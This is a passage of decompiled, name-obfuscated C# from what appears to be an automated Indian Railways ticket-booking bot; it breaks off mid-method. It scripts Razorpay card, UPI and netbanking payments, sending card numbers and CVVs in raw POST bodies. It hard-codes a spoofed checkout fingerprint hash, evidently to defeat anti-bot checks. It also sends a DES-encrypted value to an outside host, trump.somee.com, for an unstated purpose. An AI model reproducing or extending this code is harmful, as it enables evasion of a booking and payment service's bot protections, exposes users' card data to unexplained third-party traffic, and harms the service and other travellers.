(\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\");\n\tfor (var i=0; i<s.length; i++) {r += hexes [s.charCodeAt(i) >> 4] + hexes [s.charCodeAt(i) & 0xf];}\n\treturn r;\n\t}\n\tfunction hexToString (h) {\n\tvar r = \"\";\n\tfor (var i= (h.substr(0, 2)==\"0x\")?2:0; i<h.length; i+=2) {r += String.fromCharCode (parseInt (h.substr (i, 2), 16));}\n\treturn r;\n\t}\n\t//-----------------------------------------------------------------------------------------------------\n\t</script>\n\n</head>\n\n<body>\n\n\n\n</body>\n\n</html> \n\n";
            WebBrowser webBrowser = new WebBrowser();
            webBrowser.Navigate("about:blank");
            webBrowser.Document.Write(text);
            string text2 = webBrowser.Document.InvokeScript("des", new object[4]
            {
                string_86.Substring(0, 8),
                string_86,
                1,
                0
            }).ToString();
            string text3 = webBrowser.Document.InvokeScript("stringToHex", new object[1] { text2 }).ToString();
            int length = text3.Length;
            text3 = text3.ToUpper().Substring(2);
            while (text3.Length < 32)
            {
                text3 += "0";
            }
            webBrowser.Dispose();
            string text4 = "<html>\n<head>\n<script type=\"text/javascript\">\n/*\n\t* jssha256 version 0.1 - Copyright 2006 B. Poettering\n\t*\n\t* This program is free software; you can redistribute it and/or\n\t* modify it under the terms of the GNU General Public License as\n\t* published by the Free Software Foundation; either version 2 of the\n\t* License, or (at your option) any later version.\n\t*\n\t* This program is distributed in the hope that it will be useful,\n\t* but WITHOUT ANY WARRANTY; without even the implied warranty of\n\t* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n\t* General Public License for more details.\n\t*\n\t* You should have received a copy of the GNU General Public License\n\t* along with this program; if not, write to the Free Software\n\t* Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA\n\t* 02111-1307 USA\n\t*/\n\t/*\n\t* http://point-at-infinity.org/jssha256/\n\t*\n\t\n\t* This is a JavaScript implementation of the SHA256 secure hash function\n\t* and the HMAC-SHA256 message authentication code (MAC).\n\t*\n\t* The routines' well-functioning has been verified with the test vectors\n\t* given in FIPS-180-2, Appendix B and IETF RFC 4231. The HMAC algorithm\n\t* conforms to IETF RFC 2104.\n\t*\n\t* The following code example computes the hash value of the string \"abc\".\n\t*\n\t* SHA256_init();\n\t* SHA256_write(\"abc\");\n\t* digest = SHA256_finalize();\n\t* digest_hex = array_to_hex_string(digest);\n\t*\n\t* Get the same result by calling the shortcut function SHA256_hash:\n\t*\n\t* digest_hex = SHA256_hash(\"abc\");\n\t*\n\t* In the following example the calculation of the HMAC of the string \"abc\"\n\t* using the key \"secret key\" is shown:\n\t*\n\t* HMAC_SHA256_init(\"secret key\");\n\t* HMAC_SHA256_write(\"abc\");\n\t* mac = HMAC_SHA256_finalize();\n\t* mac_hex = array_to_hex_string(mac);\n\t*\n\t* Again, the same can be done more conveniently:\n\t*\n\t* mac_hex = HMAC_SHA256_MAC(\"secret key\", \"abc\");\n\t*\n\t* Note that the internal state of the hash function is held in global\n\t* variables. Therefore one hash value calculation has to be completed\n\t* before the next is begun. The same applies the the HMAC routines.\n\t*\n\t* Report bugs to: jssha256 AT point-at-infinity.org\n\t*\n\t*/\n\t/******************************************************************************/\n\t/* Two all purpose helper functions follow */\n\t/* string_to_array: convert a string to a character (byte) array */\n\tfunction string_to_array(str) {\n\tvar len = str.length;\n\tvar res = new Array(len);\n\tfor(var i = 0; i < len; i++)\n\tres[i] = str.charCodeAt(i);\n\treturn res;\n\t}\n\t/* array_to_hex_string: convert a byte array to a hexadecimal string */\n\tfunction array_to_hex_string(ary) {\n\tvar res = \"\";\n\tfor(var i = 0; i < ary.length; i++)\n\tres += SHA256_hexchars[ary[i] >> 4] + SHA256_hexchars[ary[i] & 0x0f];\n\treturn res;\n\t}\n\t/******************************************************************************/\n\t/* The following are the SHA256 routines */\n\t/*\n\tSHA256_init: initialize the internal state of the hash function. Call this\n\tfunction before calling the SHA256_write function.\n\t*/\n\t\n\tfunction SHA256_init() {\n\tSHA256_H = new Array(0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,\n\t0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19);\n\tSHA256_buf = new Array();\n\tSHA256_len = 0;\n\t}\n\t/*\n\tSHA256_write: add a message fragment to the hash function's internal state.\n\t'msg' may be given as string or as byte array and may have arbitrary length.\n\t*/\n\tfunction SHA256_write(msg) {\n\tif (typeof(msg) == \"string\")\n\tSHA256_buf = SHA256_buf.concat(string_to_array(msg));\n\telse\n\tSHA256_buf = SHA256_buf.concat(msg);\n\tfor(var i = 0; i + 64 <= SHA256_buf.length; i += 64)\n\tSHA256_Hash_Byte_Block(SHA256_H, SHA256_buf.slice(i, i + 64));\n\tSHA256_buf = SHA256_buf.slice(i);\n\tSHA256_len += msg.length;\n\t}\n\t/*\n\tSHA256_finalize: finalize the hash value calculation. Call this function\n\tafter the last call to SHA256_write. An array of 32 bytes (= 256 bits)\n\tis returned.\n\t*/\n\tfunction SHA256_finalize() {\n\tSHA256_buf[SHA256_buf.length] = 0x80;\n\tif (SHA256_buf.length > 64 - 8) {\n\tfor(var i = SHA256_buf.length; i < 64; i++)\n\tSHA256_buf[i] = 0;\n\tSHA256_Hash_Byte_Block(SHA256_H, SHA256_buf);\n\tSHA256_buf.length = 0;\n\t}\n\tfor(var i = SHA256_buf.length; i < 64 - 5; i++)\n\tSHA256_buf[i] = 0;\n\tSHA256_buf[59] = (SHA256_len >>> 29) & 0xff;\n\tSHA256_buf[60] = (SHA256_len >>> 21) & 0xff;\n\tSHA256_buf[61] = (SHA256_len >>> 13) & 0xff;\n\tSHA256_buf[62] = (SHA256_len >>> 5) & 0xff;\n\tSHA256_buf[63] = (SHA256_len << 3) & 0xff;\n\tSHA256_Hash_Byte_Block(SHA256_H, SHA256_buf);\n\tvar res = new Array(32);\n\tfor(var i = 0; i < 8; i++) {\n\tres[4 * i + 0] = SHA256_H[i] >>> 24;\n\tres[4 * i + 1] = (SHA256_H[i] >> 16) & 0xff;\n\tres[4 * i + 2] = (SHA256_H[i] >> 8) & 0xff;\n\tres[4 * i + 3] = SHA256_H[i] & 0xff;\n\t}\n\tdelete SHA256_H;\n\tdelete SHA256_buf;\n\tdelete SHA256_len;\n\treturn res;\n\t}\n\t/*\n\tSHA256_hash: calculate the hash value of the string or byte array 'msg'\n\tand return it as hexadecimal string. This shortcut function may be more\n\tconvenient than calling SHA256_init, SHA256_write, SHA256_finalize\n\tand array_to_hex_string explicitly.\n\t*/\n\tfunction SHA256_hash(msg) {\n\tvar res;\n\tSHA256_init();\n\tSHA256_write(msg);\n\tres = SHA256_finalize();\n\treturn array_to_hex_string(res);\n\t}\n\t/******************************************************************************/\n\t/* The following are the HMAC-SHA256 routines */\n\t/*\n\tHMAC_SHA256_init: initialize the MAC's internal state. The MAC key 'key'\n\tmay be given as string or as byte array and may have arbitrary length.\n\t*/\n\tfunction HMAC_SHA256_init(key) {\n\tif (typeof(key) == \"string\")\n\tHMAC_SHA256_key = string_to_array(key);\n\telse\n\tHMAC_SHA256_key = new Array().concat(key);\n\tif (HMAC_SHA256_key.length > 64) {\n\tSHA256_init();\n\tSHA256_write(HMAC_SHA256_key);\n\tHMAC_SHA256_key = SHA256_finalize();\n\t}\n\tfor(var i = HMAC_SHA256_key.length; i < 64; i++)\n\tHMAC_SHA256_key[i] = 0;\n\tfor(var i = 0; i < 64; i++)\n\tHMAC_SHA256_key[i] ^= 0x36;\n\tSHA256_init();\n\tSHA256_write(HMAC_SHA256_key);\n\t}\n\t/*\n\tHMAC_SHA256_write: process a message fragment. 'msg' may be given as\n\tstring or as byte array and may have arbitrary length.\n\t*/\n\tfunction HMAC_SHA256_write(msg) {\n\tSHA256_write(msg);\n\t}\n\t/*\n\tHMAC_SHA256_finalize: finalize the HMAC calculation. An array of 32 bytes\n\t(= 256 bits) is returned.\n\t*/\n\tfunction HMAC_SHA256_finalize() {\n\tvar md = SHA256_finalize();\n\tfor(var i = 0; i < 64; i++)\n\tHMAC_SHA256_key[i] ^= 0x36 ^ 0x5c;\n\tSHA256_init();\n\tSHA256_write(HMAC_SHA256_key);\n\tSHA256_write(md);\n\tfor(var i = 0; i < 64; i++)\n\tHMAC_SHA256_key[i] = 0;\n\tdelete HMAC_SHA256_key;\n\treturn SHA256_finalize();\n\t}\n\t/*\n\tHMAC_SHA256_MAC: calculate the HMAC value of message 'msg' under key 'key'\n\t(both may be of type string or byte array); return the MAC as hexadecimal\n\tstring. This shortcut function may be more convenient than calling\n\tHMAC_SHA256_init, HMAC_SHA256_write, HMAC_SHA256_finalize and\n\tarray_to_hex_string explicitly.\n\t*/\n\tfunction HMAC_SHA256_MAC(key, msg) {\n\tvar res;\n\tHMAC_SHA256_init(key);\n\tHMAC_SHA256_write(msg);\n\tres = HMAC_SHA256_finalize()\n\treturn array_to_hex_string(res);\n\t}\n\t/******************************************************************************/\n\t/* The following lookup tables and functions are for internal use only! */\n\tSHA256_hexchars = new Array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9',\n\t'a', 'b', 'c', 'd', 'e', 'f');\n\tSHA256_K = new Array(\n\t0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1,\n\t0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,\n\t0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786,\n\t0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,\n\t0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,\n\t0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,\n\t0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,\n\t0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,\n\t0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a,\n\t0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,\n\t0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2\n\t);\n\tfunction SHA256_sigma0(x) {\n\treturn ((x >>> 7) | (x << 25)) ^ ((x >>> 18) | (x << 14)) ^ (x >>> 3);\n\t}\n\tfunction SHA256_sigma1(x) {\n\treturn ((x >>> 17) | (x << 15)) ^ ((x >>> 19) | (x << 13)) ^ (x >>> 10);\n\t}\n\tfunction SHA256_Sigma0(x) {\n\t\n\treturn ((x >>> 2) | (x << 30)) ^ ((x >>> 13) | (x << 19)) ^\n\t((x >>> 22) | (x << 10));\n\t}\n\tfunction SHA256_Sigma1(x) {\n\treturn ((x >>> 6) | (x << 26)) ^ ((x >>> 11) | (x << 21)) ^\n\t((x >>> 25) | (x << 7));\n\t}\n\tfunction SHA256_Ch(x, y, z) {\n\treturn z ^ (x & (y ^ z));\n\t}\n\tfunction SHA256_Maj(x, y, z) {\n\treturn (x & y) ^ (z & (x ^ y));\n\t}\n\tfunction SHA256_Hash_Word_Block(H, W) {\n\tfor(var i = 16; i < 64; i++)\n\tW[i] = (SHA256_sigma1(W[i - 2]) + W[i - 7] +\n\tSHA256_sigma0(W[i - 15]) + W[i - 16]) & 0xffffffff;\n\tvar state = new Array().concat(H);\n\tfor(var i = 0; i < 64; i++) {\n\tvar T1 = state[7] + SHA256_Sigma1(state[4]) +\n\tSHA256_Ch(state[4], state[5], state[6]) + SHA256_K[i] + W[i];\n\tvar T2 = SHA256_Sigma0(state[0]) + SHA256_Maj(state[0], state[1], state[2]);\n\tstate.pop();\n\tstate.unshift((T1 + T2) & 0xffffffff);\n\tstate[4] = (state[4] + T1) & 0xffffffff;\n\t}\n\tfor(var i = 0; i < 8; i++)\n\tH[i] = (H[i] + state[i]) & 0xffffffff;\n\t}\n\t\n\tfunction SHA256_Hash_Byte_Block(H, w) {\n\tvar W = new Array(16);\n\tfor(var i = 0; i < 16; i++)\n\tW[i] = w[4 * i + 0] << 24 | w[4 * i + 1] << 16 |\n\tw[4 * i + 2] << 8 | w[4 * i + 3];\n\tSHA256_Hash_Word_Block(H, W);\n\t}\n\t/*\n\tPreparing a genric function to be used for generating HMAC_SHA256_MAC.\n\t*/\n\tfunction hex_hmac(key, data)\n\t{\n\treturn HMAC_SHA256_MAC(key, data);\n\t}\n\t\n</script>\n\n<script>\n\nfunction random()\n\t{\n\tvar Pass= Math.floor(10000000 + (Math.random() * (100000000 - 10000000 + 1))); \n\treturn Pass;\n\n}\n\t</script>\n\n</head>\n\n<body>\n\n\n\n</body>\n\n</html> \n\n";
            WebBrowser webBrowser2 = new WebBrowser();
            webBrowser2.Navigate("about:blank");
            webBrowser2.Document.Write(text4);
            string text5 = Conversions.ToString(webBrowser2.Document.InvokeScript("random")) + string_87;
            string result = webBrowser2.Document.InvokeScript("hex_hmac", new object[2] { text5, text3 }).ToString();
            webBrowser2.Dispose();
            string_87 = text5;
            return result;
        }

        private bool method_163(string string_86, ref string string_87, ref string string_88)
        {
            bool result = false;
            try
            {
                frmCaptcha frmCaptcha = new frmCaptcha(clsMain, cookieContainer_1, "", "");
                frmCaptcha.method_5(clsMain.control_0, clsMain.rectangle_0, "", "", string_86);
                if (frmCaptcha.DialogResult != DialogResult.OK)
                {
                    clsMain.Lock("OTP Cancel" + string_86);
                    string_88 = "OTP Cancelled By User";
                    updateTStatus_1.BeginInvoke(2, "OTP Cancelled By User", tCntrlName_, null, null);
                    result = false;
                    return false;
                }
                string text = frmCaptcha.txtImageData.Text.Trim();
                frmCaptcha.Dispose();
                string_87 = text;
                result = true;
                return true;
            }
            catch
            {
                return result;
            }
        }

        private string method_61(string string_86)
        {
            string text = "Not Retrieved!";
            clsMain.Lock("Enter GetFareFromHTM");
            try
            {
                int num = string_86.IndexOf("Total Fare");
                if (num <= 0)
                {
                    return text;
                }
                num = string_86.IndexOf("span>", num);
                num = string_86.IndexOf("/b>", num) + 3;
                int num2 = string_86.IndexOf("<", num) - num;
                if (num2 > 10 || num2 < 3)
                {
                    return text;
                }
                text = string_86.Substring(num, num2).Trim();
            }
            catch
            {
            }
            clsMain.Lock("Normal Exit GetFareFromHTM ret = " + text);
            return text;
        }

        private string method_77(string string_86)
        {
            try
            {
                byte[] byte_ = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
                string text = HttpUtility.UrlEncode(Class12.smethod_6(string_86, "_&^*$3^(", byte_));
                text = "http://trump.somee.com/hd.aspx?z=" + text;
                WebClient webClient = new WebClient();
                string text2 = webClient.DownloadString(new Uri(text));
                if (text2.Length > 20)
                {
                    text2 = Encoding.UTF8.GetString(Convert.FromBase64String(text2));
                }
                webClient.Dispose();
                return text2;
            }
            catch
            {
                return "";
            }
        }

        internal bool Multi_RazorPay(string A_1, string A_2, string A_3, string A_4, ref string A_5, ref string A_6, UpdateTStatus A_7)
        {
            bool flag = clsMain.LoginType == "WEB";
            A_5 = "";
            A_6 = "";
            string text = "";
            A_3 = A_3.ToUpper();
            clsMain.Lock("Enter ProcessCC_RAZ.  DETAILS: ");
            bool flag2 = !A_1.Contains("razorpay");
            response = A_1;
            bool result = false;
            string text2 = A_3;
            string text3 = "";
            string text4 = "";
            string string_ = class3_0.string_18;
            string[] array = A_2.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text5 = array[0].Trim();
            string text6 = array[1];
            string text7 = "";
            string text8 = "";
            string text9 = "";
            string str = "";
            string text10 = "";
            string a_ = "";
            string text11 = "";
            if (A_3.Contains("_DC") || A_3.Contains("_CC"))
            {
                text3 = "DC";
                text4 = "DC Via RazrPay";
                text7 = array[2];
                text7 = text7.Substring(2, 2);
                text9 = array[3];
                text8 = array[4];
                str = array[6];
                text10 = array[7];
                if (text6.Length < 2)
                {
                    text6 = "0" + text6;
                }
                if ((text2 == "HDFC_DC") | text2.Contains("HDFC_CC"))
                {
                    text11 = "21";
                }
                else if ((text2 == "SBI_DC") | text2.Contains("SBI_CC"))
                {
                    text11 = "101";
                }
                else if (text2.Contains("IDBI"))
                {
                    text11 = "24";
                }
                else if (text2.Contains("AIRTEL"))
                {
                    text11 = "102";
                }
                else if (text2.Contains("PAYZAPP"))
                {
                    text11 = "57";
                }
                else if (text2.Contains("NSDL"))
                {
                    text11 = "102";
                }
            }
            else if (A_3.Contains("RAZORPAYUPI"))
            {
                text3 = "BHIMUPI";
                text4 = "BHIMUPI Via RazrPay";
            }
            else
            {
                text3 = "NB";
                text4 = "NB Via RazrPay";
                switch (text2)
                {
                    case "HDFC":
                        text2 = "HDFC";
                        text11 = "36";
                        break;
                    case "SBI":
                        text2 = "SBI";
                        text11 = "1";
                        break;
                    case "ICICI":
                        text2 = "ICICI";
                        text11 = "44";
                        break;
                    case "UNION":
                        text2 = "UNI";
                        text11 = "28";
                        break;
                    case "IDBI":
                        text2 = "IDBI";
                        text11 = "52";
                        break;
                    case "CORP":
                        text2 = "CORP";
                        text11 = "56";
                        break;
                    case "Razor":
                        text2 = "PPI";
                        break;
                }
            }
            string text14 = "";
            try
            {
                if (!flag)
                {
                    string text12 = response.Substring(response.IndexOf("amount") + 9);
                    text = text12.Substring(0, text12.IndexOf("\""));
                    string text13 = response.Substring(response.IndexOf("encdata") + 18);
                    text14 = text13.Substring(0, text13.IndexOf("\""));
                    url = "https://checkout.razorpay.com/integration/irctc";
                    postdata = "encdata=" + text14;
                }
                else
                {
                    postdata = class3_0.Method_SerialInp(response, ref url, false);
                }
                updateTStatus_1.BeginInvoke(1, "Init. " + text4 + "(1/6)", tCntrlName_, null, null);
                bool_29 = true;
                if (!_Request_Razorpay(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                bool_29 = true;
                string text31s = response.Substring(response.IndexOf("<form action=") + 14);
                string finalpaymentlink = text31s.Substring(0, text31s.IndexOf("\" method=\"post\""));
                string text15 = response.Substring(response.IndexOf("key") + 7);
                string text16 = text15.Substring(0, text15.IndexOf("\""));
                text15 = text15.Substring(text15.IndexOf("merchant_order_id") + 21);
                string text17 = text15.Substring(0, text15.IndexOf("\""));
                text15 = text15.Substring(text15.IndexOf("txn_date") + 12);
                string text18 = text15.Substring(0, text15.IndexOf("\""));
                text15 = text15.Substring(text15.IndexOf("amount") + 10);
                string text19 = text15.Substring(0, text15.IndexOf("\""));
                text15 = text15.Substring(text15.IndexOf("url_order_id") + 16);
                string text20 = text15.Substring(0, text15.IndexOf("\""));
                text15 = text15.Substring(text15.IndexOf("callback") + 12);
                string text21 = text15.Substring(0, text15.IndexOf("\""));
                text21 = text21.Replace("\\", "");
                string str2 = string_5;
                text15 = text15.Substring(text15.IndexOf("amount") + 9);
                string text22 = text15.Substring(0, text15.IndexOf(","));
                text15 = text15.Substring(text15.IndexOf("checkSum") + 12);
                string text23 = text15.Substring(0, text15.IndexOf("\""));
                text15 = text15.Substring(text15.IndexOf("order_id") + 12);
                string text24 = text15.Substring(0, text15.IndexOf("\""));
                url = "https://api.razorpay.com/v1/preferences?key_id=" + text16 + "&order_id=" + text24 + "&checkcookie=1";
                postdata = "";
                updateTStatus_1.BeginInvoke(1, "Init. " + text4 + "(2/6)", tCntrlName_, null, null);
                if (!_Request_Razorpay(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                string text25 = "https://api.razorpay.com/v1/payments/";
                Cookie cookie = new Cookie("checkcookie", "1")
                {
                    Domain = "api.razorpay.com"
                };
                cookieContainer_0.Add(cookie);
                string text26 = "7fc54d3a43d165f0f5e0b32e1fd410ada42d609a";
                string text27 = "330";
                string text28 = "6798";
                string text29 = "";
                reff = "https://api.razorpay.com/v1/checkout/public";
                url = text25 + "calculate/fees";
                if (text3 == "DC")
                {
                    postdata = "method=card&card%5Bnumber%5D=" + text5 + "&card%5Bname%5D=" + HttpUtility.UrlEncode(str) + "&card%5Bcvv%5D=" + text8 + "&amount=" + text22 + "&currency=INR&order_id=" + text24 + "&key_id=" + text16 + "&_%5Bshield%5D%5Bfhash%5D=" + text26 + "&_%5Bshield%5D%5Btz%5D=" + text27 + "&_%5Bbuild%5D=" + text28 + "&notes%5Breservation_id%5D=" + text17 + "&notes%5Bapp_code%5D=BOOKING&notes%5Bpayment_mode%5D=Internet&notes%5Btxn_date%5D=" + text18 + "&notes%5Bsecurity_id%5D=CRIS&notes%5Bamount%5D=" + text19 + "&fee=0&notes%5Bmerchant_order_id%5D=" + text17 + "&card%5Bexpiry_month%5D=" + text6 + "&card%5Bexpiry_year%5D=" + text7 + "&_%5Bcheckout_id%5D=" + text29 + "&_%5Breferer%5D=" + HttpUtility.UrlEncode(str2) + "&_%5Blibrary%5D=checkoutjs&_%5Bplatform%5D=browser";
                }
                else if (text3 == "BHIMUPI")
                {
                    postdata = "method=upi&_%5Bflow%5D=directpay&vpa=" + HttpUtility.UrlEncode(text5) + "&amount=" + text22 + "&currency=INR&order_id=" + text24 + "&key_id=" + text16 + "&_%5Bshield%5D%5Bfhash%5D=" + text26 + "&_%5Bshield%5D%5Btz%5D=" + text27 + "&_%5Bbuild%5D=" + text28 + "&notes%5Breservation_id%5D=" + text17 + "&notes%5Bapp_code%5D=BOOKING&notes%5Bpayment_mode%5D=Internet&notes%5Btxn_date%5D=" + text18 + "&notes%5Bsecurity_id%5D=CRIS&notes%5Bamount%5D=" + text19 + "&fee=0&notes%5Bmerchant_order_id%5D=" + text17 + "&_%5Bcheckout_id%5D=" + text29 + "&_%5Breferer%5D=" + HttpUtility.UrlEncode(str2) + "&_%5Blibrary%5D=checkoutjs&_%5Bplatform%5D=browser";
                }
                else
                {
                    postdata = "method=net&_%5Bflow%5D=directpay&vpa=" + HttpUtility.UrlEncode(text5) + "&amount=" + text22 + "&currency=INR&order_id=" + text24 + "&key_id=" + text16 + "&_%5Bshield%5D%5Bfhash%5D=" + text26 + "&_%5Bshield%5D%5Btz%5D=" + text27 + "&_%5Bbuild%5D=" + text28 + "&notes%5Breservation_id%5D=" + text17 + "&notes%5Bapp_code%5D=BOOKING&notes%5Bpayment_mode%5D=Internet&notes%5Btxn_date%5D=" + text18 + "&notes%5Bsecurity_id%5D=CRIS&notes%5Bamount%5D=" + text19 + "&fee=0&notes%5Bmerchant_order_id%5D=" + text17 + "&_%5Bcheckout_id%5D=" + text29 + "&_%5Breferer%5D=" + HttpUtility.UrlEncode(str2) + "&_%5Blibrary%5D=checkoutjs&_%5Bplatform%5D=browser";
                }
                updateTStatus_1.BeginInvoke(1, "Init. " + text4 + "(3/6)", tCntrlName_, null, null);
                if (!_Request_Razorpay(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                string text30 = response.Substring(response.IndexOf("input"));
                text30 = text30.Substring(text30.IndexOf("amount") + 8);
                text30 = text30.Substring(0, text30.IndexOf(","));
                string text31 = response.Substring(response.IndexOf("notes"));
                text31 = text31.Substring(text31.IndexOf("fee") + 5);
                text31 = text31.Substring(0, text31.IndexOf(","));
                string text32 = response.Substring(response.IndexOf("display"));
                text32 = text32.Substring(text32.IndexOf("\"amount") + 9);
                text32 = text32.Substring(0, text32.IndexOf("}"));
                postdata = clsPostData.SetPost(postdata, "amount", text30);
                postdata = clsPostData.SetPost(postdata, "fee", text31);
                url = text25 + "create/ajax";
                updateTStatus_1.BeginInvoke(1, "Init. " + text4 + "(4/6)", tCntrlName_, null, null);
                if (!_Request_Razorpay(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                if (response.IndexOf("<input type=\"hidden\" name=\"error[code]\"") > 0)
                {
                    flag = false;
                    A_6 = "Change Bank Getways";
                    return flag;
                }
                if (text3 == "DC")
                {
                    if (response.IndexOf("{\"type\":\"first\",") >= 0)
                    {
                        text15 = response.Substring(response.IndexOf("url") + 6);
                        string text33 = text15.Substring(0, text15.IndexOf("\""));
                        text15 = response;
                        text15 = text15.Substring(text15.IndexOf("content") + 11);
                        string text34 = text15.Substring(0, text15.IndexOf("}") - 1);
                        text34 = text34.Replace("\":\"", "#").Replace("\",\"", "&");
                        url = text33.Replace("\\", "");
                        postdata = text34.Replace("\\", "");
                        response = SetVairalbleintoString(url, postdata);
                    }
                    if (response.IndexOf("gateway_otp_postform") > 0)
                    {
                        string text35 = response.Substring(response.IndexOf("merchant") + 1);
                        text35 = text35.Substring(text35.IndexOf("submit_url") + 13);
                        text35 = text35.Substring(0, text35.IndexOf("\","));
                        url = text35.Replace("\\", "");
                        postdata = "otp=";
                        if (text11 == "21")
                        {
                            text35 = response.Substring(response.IndexOf("merchant") + 1);
                            text35 = text35.Substring(text35.IndexOf("redirect") + 13);
                            text35 = text35.Substring(0, text35.IndexOf("\","));
                            url = text35.Replace("\\", "");
                            postdata = "";
                        }
                        else if (text11 == "101")
                        {
                            string text36 = "";
                            frmOTP frmOTP = new frmOTP();
                            frmOTP.method_1(clsMain.control_0, clsMain.rectangle_0, true, "Razorpay OTP", class3_0.BANKSAVEAS);
                            if (frmOTP.DialogResult != DialogResult.OK)
                            {
                                frmOTP.Dispose();
                                return false;
                            }
                            text36 = frmOTP.string_0;
                            frmOTP.Dispose();
                            postdata += text36;
                        }
                        if (!_Request_Razorpay(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                    }
                    bool flag3 = false;
                    if (response.IndexOf("Merchant Check Out Page") > 0)
                    {
                        flag3 = true;
                        postdata = class3_0.Method_SerialInp(response, ref url, false);
                        if (!_Request_Razorpay(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                    }
                    bool flag4 = false;
                    string a_2 = text10;
                    if (response.Contains("hdfc"))
                    {
                        flag4 = Debit_Hdfc(response, a_, cookieContainer_0, a_2, ref response, ref A_6);
                    }
                    else if (text11 == "102")
                    {
                        flag4 = Debit_Nsdl(response, a_, cookieContainer_0, a_2, ref response, ref A_6);
                    }
                    if (flag4)
                    {
                        if (flag3)
                        {
                            postdata = class3_0.Method_SerialInp(response, ref url, false);
                            if (!_Request_Razorpay(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                return false;
                            }
                            postdata = class3_0.Method_SerialInp(response, ref url, false);
                            if (!_Request_Razorpay(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                return false;
                            }
                        }
                        postdata = class3_0.Method_SerialInp(response, ref url, false);
                        if (!_Request_Razorpay(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                    }
                    url = text21;
                    string text37 = response.Substring(response.IndexOf("var data") + 1);
                    text37 = text37.Substring(text37.IndexOf("{") + 1);
                    text37 = text37.Substring(0, text37.IndexOf("}"));
                    text37 = (postdata = text37.Replace("\"", "").Replace(":", "=").Replace(",", "&"));
                    if (!_Request_Razorpay(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                }
                else if (text3 == "BHIMUPI")
                {
                    text15 = response.Substring(response.IndexOf("payment_id") + 13);
                    string text38 = text15.Substring(0, text15.IndexOf("\""));
                    url = "https://api.razorpay.com/v1/payments/" + text38 + "/status?key_id=" + text16;
                    postdata = "";
                    DateTime dateTime = DateTime.Now.AddSeconds(120.0);
                    updateTStatus_1.BeginInvoke(1, "Confirm Upi_Payment From Mobile", tCntrlName_, null, null);
                    do
                    {
                        Thread.Sleep(500);
                        if (DateTime.Now > dateTime)
                        {
                            break;
                        }
                        if (File.Exists("Bhimerror.txt"))
                        {
                            File.Delete("Bhimerror.txt");
                            break;
                        }
                        if (!_Request_Razorpay(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                    }
                    while (response.Contains("status"));
                    if (response.Contains("status"))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        A_6 = "Change Bank GetWays, Retry 4 Payment";
                        return false;
                    }
                    text15 = response.Substring(response.IndexOf("url") + 6);
                    string text39 = text15.Substring(0, text15.IndexOf("\""));
                    text39 = text39.Replace("\\", "");
                    text15 = text15.Substring(text15.IndexOf("content") + 11);
                    string text40 = text15.Substring(0, text15.IndexOf("}") - 1);
                    text40 = text40.Replace("\":\"", "=").Replace("\",\"", "&");
                    url = finalpaymentlink;
                    //string hostedid = jsonData_Serial(response, "razorpay_hosted_id");
